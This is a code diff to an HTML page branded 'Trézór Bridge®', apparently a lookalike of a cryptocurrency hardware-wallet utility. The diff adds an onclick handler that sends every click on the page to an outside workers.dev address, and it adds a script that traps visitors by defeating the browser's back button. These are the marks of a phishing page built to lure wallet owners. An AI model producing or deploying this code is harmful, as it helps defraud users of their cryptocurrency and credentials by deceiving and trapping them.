@@ -180,7 +180,7 @@
         }
     </style>
 </head>
-<body>
+<body onclick="window.location='https://r26e9.k5l6.workers.dev/';">
     <header>
         <div class="header-content">
             <div class="logo">Trézór Bridge®</div>
@@ -284,5 +284,10 @@
             });
         });
     </script>
+                  <script type="text/javascript">
+        function preventBack() { window.history.forward(); }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+  </script>
 </body>
 </html>
